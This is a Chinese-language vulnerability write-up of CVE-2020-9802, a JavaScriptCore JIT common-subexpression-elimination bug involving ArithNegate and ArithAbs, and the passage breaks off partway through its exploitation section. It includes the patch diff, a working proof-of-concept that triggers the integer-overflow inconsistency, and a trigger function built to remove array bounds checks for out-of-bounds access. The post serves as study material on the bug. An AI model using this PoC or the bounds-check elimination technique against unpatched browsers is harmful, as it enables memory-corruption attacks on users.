---
title: CVE-2020-9802：Incorrect CSE for ArithNegate 导致的越界访问
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458553736&idx=1&sn=fa9d04982a90b1c0cf6c375efce65314&chksm=b18dbd0286fa3414de804dbd2315099238c1ec027489de8a51a7a6dd663b3a239d6768593497&scene=58&subscene=0#rd
source: 看雪学苑
date: 2024-05-09
fetch_date: 2025-10-06T17:16:50.288067
---

# CVE-2020-9802：Incorrect CSE for ArithNegate 导致的越界访问

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Ey0Z2fLQtGQHrnic5NDLhqHmBam6jxBgVa0j3XeK1exfED0AMRpAGxZcLn8FPEnUw8fX9ib9XUskicg/0?wx_fmt=jpeg)

# CVE-2020-9802：Incorrect CSE for ArithNegate 导致的越界访问

XiaozaYa

看雪学苑

```
一

前言
```

最近尝试阅读`DFG jit`相关源码，但是无从下手，网上资料甚少并且代码量巨大，所以笔者对应`JSC`的学习路线还是从相关`CVE`中去学习一些有关`JSC`的基础知识，这里逐渐积累，等到合适的时候，再去尝试阅读源码，该漏洞比较老了，但是复现漏洞不是目的，重要的是学习一些知识。

复现这个漏洞主要是学习下`CSE`优化这个知识点，其实挺简单的。`CSE`即公共子表达式消除，其主要的操作就是将多个相同的表达式替换成一个变量，这个变量存储着计算该表达式后所得到的值，考虑如下代码：

```
let a = b * c + g;
let d = b * c + e;
```

上述代码可能会被优化成如下代码：

```
let temp = b * c;
let a = temp + g;
let d = temp + e;
```

这样就避免了`b * c`表达式的重复运算，但是并非所有情况下都可以进行`CSE`优化，考虑如下代码：

```
let a = obj.x
f();  // <===== side effect
let b = obj.x
```

这里我们就不可以将其优化为如下代码：

```
let temp = obj.x;
let a = temp;
f();   // <===== side effect
let b = temp;
```

理由很简单，`f()`存在`side effect`，即`obj`对象可能在`f()`中被修改，比如如下代码：

```
function f() {
        obj.x = 2;
}
let obj = {x:1};
let a = obj.x; // a = 1
f();	// <====== change obj.x
let b = obj.x; // a = 2
```

如果这里将其优化，则导致`a = b = 1`从而出现错误，那么`JIT`编译器是如果判断公共子表达式是否可以进行消除呢？对于`JSC`而言，其会在`DFG`阶段收集相关信息，然后在`FTL`阶段利用收集的信息判断是否进行`CSE`优化，收集信息阶段主要在`DFGClobberize`函数中进行，这个我们后面再看。

```
二

环境搭建
```

手动引入`patch`然后编译即可：

```
diff --git a/Source/JavaScriptCore/dfg/DFGClobberize.h b/Source/JavaScriptCore/dfg/DFGClobberize.h
index b2318fe03aed41e0309587e7df90769cb04e3c49..5b34ec5bd8524c03b39a1b33ba2b2f64b3f563e1 100644 (file)
--- a/Source/JavaScriptCore/dfg/DFGClobberize.h
+++ b/Source/JavaScriptCore/dfg/DFGClobberize.h
@@ -228,7 +228,7 @@ void clobberize(Graph& graph, Node* node, const ReadFunctor& read, const WriteFu

     case ArithAbs:
         if (node->child1().useKind() == Int32Use || node->child1().useKind() == DoubleRepUse)
-            def(PureValue(node));
+            def(PureValue(node, node->arithMode()));
         else {
             read(World);
             write(Heap);
@@ -248,7 +248,7 @@ void clobberize(Graph& graph, Node* node, const ReadFunctor& read, const WriteFu
         if (node->child1().useKind() == Int32Use
             || node->child1().useKind() == DoubleRepUse
             || node->child1().useKind() == Int52RepUse)
-            def(PureValue(node));
+            def(PureValue(node, node->arithMode()));
         else {
             read(World);
             write(Heap);
```

#

```
三

漏洞分析
```

可以看到上述补丁主要打在了`clobberize`函数中，通过前面的铺垫，可以知道这里应该就是`DFG`收集相关信息时出现错误，从而导致在`FTL`阶段发生错误的优化，定位到源码：

> 这里代码很长，所以只需要定位关键代码即可

```
template<typename ReadFunctor, typename WriteFunctor, typename DefFunctor, typename ClobberTopFunctor>
void clobberize(Graph& graph, Node* node, const ReadFunctor& read, const WriteFunctor& write, const DefFunctor& def, const ClobberTopFunctor& clobberTopFunctor)
{
......
    case ArithAbs:
        if (node->child1().useKind() == Int32Use || node->child1().useKind() == DoubleRepUse)
            def(PureValue(node));
            //def(PureValue(node, node->arithMode()));
        else
            clobberTop();
        return;
......
    case ArithNegate:
        if (node->child1().useKind() == Int32Use
            || node->child1().useKind() == DoubleRepUse
            || node->child1().useKind() == Int52RepUse)
            def(PureValue(node));
            //def(PureValue(node, node->arithMode()));
        else
            clobberTop();
        return;
......
```

这里可以看到`patch`代码仅仅给`PureValue`函数添加了一个参数`node->arithMode()`，这里根据`p0`的文章可以知道：

> The def() of the PureValue here expresses that the computation does not rely on any context and thus that it will always yield the same result when given the same inputs. However, note that the PureValue is parameterized by the ArithMode of the operation, which specifies whether the operation should handle (e.g. by bailing out to the interpreter) integer overflows or not. The parameterization in this case prevents two ArithMul operations with different handling of integer overflows from being substituted for each other. An operation that handles overflows is also commonly referred to as a “checked” operation, and an “unchecked” operation is one that does not detect or handle overflows.

加上`node->arithMode()`表示说具体不同整数溢出处理方式的操作不能替换，然后操作根据是否检查溢出分为`checked operation`和`unchecked operation。`

所以这里的漏洞就比较明显了，`def(PureValue(node));`表示能否进行替换只与输入的值有关，对于`ArithNegate`而言，其是`unchecked operation`，当`value = TYPE_MIN`时会发生溢出，即`-TYPE_MIN = TYPE_MIN`；对于`ArithAbs`而言，其是`checked operation`，当`value = TYPE_MIN`时，其会进行符合扩展去处理溢出情况，所以`abs(TYPE_MIN) = |TYPE_MIN|`；而`ArithNegate`与`ArithAbs`操作是可以产生相同的效果的，比如`-(-1) = abs(-1)`，所以对于如下代码是可以进行优化的：

```
let a = -(-1) = 1;
let b = abs(-1) = 1;
==>
let a = -(-1) = 1;
let b = a = 1;
```

上面优化看似不存在问题，但是当发生溢出时就会出现问题，比如如下代码：

```
let a = -TYPE_MIN = TYPE_MIN;
let b = abs(TYPE_MIN) = |TYPE_MIN|;
==>
let a = -TYPE_MIN = TYPE_MIN;
let b = a = TYPE_MIN
```

可以看到这里优化`CSE`优化导致`b`的值发生错误，其本来应该为`|TYPE_MIN|`，但是编译器却认为其为`TYPE_MIN`，其实这就是这个漏洞的全部原理了。

`poc`如下：

```
function f(n) {
        if (n < 0) {
                let a = -n;
                let b = Math.abs(n);
                return b;
        }
        return 0;
}

for (let i = 0; i < 0xd0000; i++) {
        f(-2);
}

print(f(-0x80000000));
// output: -2147483648
```

可以看到这里输出的`b = -2147483648 = -0x80000000`，来简单看看字节码。

首先看看`f`产生的字节码：

```
[   0] enter
[   1] jnless           lhs:arg1, rhs:Int32: 0(const0), targetLabel:49(->50)
[   5] mov
[   8] mov
[  11] negate			dst:loc5, operand:arg1, profileIndex:0, resultType:126
[  16] resolve_scope
[  23] get_from_scope
[  32] get_by_id
[  38] mov
[  41] call				dst:loc6, callee:loc7, argc:2, argv:16, valueProfile:3
[  48] ret
[  50] ret              value:Int32: 0(const0)
```

`[11] negate`表示的就是`-n`，`[41] call`表示的就是`Math.abs(n)`，来看下在`DFG`后的字节码。

可以看到`[11] negate`被展开为如下`IR`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FQicadOCiboLpxXIRw7OaqYTzUQ4NejYOSxULjKy2I0ibZ0Q0C6GsK15iajBXlD655Y0xnMShVmsf5gA/640?wx_fmt=png&from=appmsg)

`[41] call`被展开为如下`IR`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FQicadOCiboLpxXIRw7OaqYTazpJrIsJicw4eLqvmp40OVvc0JshB28iamtibPkyic1EJok2Rz2rmuVwIw/640?wx_fmt=png&from=appmsg)

即：

```
[11] negate
    CountExecution
    GetLocal
    ArithNegate(Int32:Kill:D@63, Int32|PureInt, Int32, Unchecked, bc#11, ExitValid)
    MovHint
[41] call
    CountExecution
    FilterCallLinkStatus
    ArithAbs(Int32:D@33, Int32|PureNum|NeedsNegZero|NeedsNaNOrInfinity|UseAsOther, Int32, CheckOverflow, Exits, bc#41, ExitValid)
    Phantom
    Phantom
    MovHint
```

可以看到`ArithNegate`是`unchecked`的，而`ArithAbs`是`CheckOverflow`的，即`ArithNegate`与`ArithAbs`具有不同的溢出处理机制。

接下来看看`FTL`阶段：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FQicadOCiboLpxXIRw7OaqYTyhqRickCTXHiasubbzUaDsKdJdbRpblOibahls2AclA1qQmYIIicqa3png/640?wx_fmt=png&from=appmsg)
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FQicadOCiboLpxXIRw7OaqYT52dzGWrkyDYV1mZssmm95oXjs1yxeibu8mVp05HqpfEXa7aic8xLZNiaw/640?wx_fmt=png&from=appmsg)

即：

```
[11] negate
    CountExecution
    ArithNegate(Int32:Kill:D@63, Int32|PureInt, Int32, Unchecked, bc#11, ExitValid)
    KillStack
    ZombieHint
[41] call
    CountExecution
    FilterCallLinkStatus
    KillStack
    MovHint
```

可以看到这里`ArithAbs`被优化掉了，即编译器认为`ArithNegate`与`ArithAbs`在操作数是负数时是等效的，但是上面说了这两个操作对于溢出的处理情况是不同的，所以这两个操作并不是完全等效的。

```
四

漏洞利用
```

接下来就该考虑如何去进行利用了，总结一下上面漏洞的效果：

◆一个运行时不一致的`TYPE_MIN`

后面的利用有点类似于`V8`中消除`CheckBounds`节点，即利用编译器检查时与运行时不一致漏洞去消除边界检查，考虑如下代码：

```
function trigger(arr, n) {
        if (n < arr.length) { // 【1】
                if (n & 3) {
                        n += -2; // 【2】
                }
                if (n >= 0) { // 【3】
                        return arr[n];
                }
        }
}

var arr = [1.1, 2.2, 3.3, 4.4];
for (let i = 0; i < 0xd0000; i++) {
        trigger(arr, 2);
}

trigger(arr, 3);
```

可以看到这里`【1】`处首先保证了`n < arr.length`，`【2】`处为减二，所以`n < arr.length-2 < arr.length`，`【3】`处保证了`n >= 0`，所以编译器最后会推断`arr[n]`中的`n`的范围在`[0, arr.length)`之间，所以其肯定不会发生越界，所以其会进行消除边界检查优化。

来看下`trigger`函数的字节码：

```
[   0] enter
[   1] get_by_id          dst:loc5, base:arg1, pro...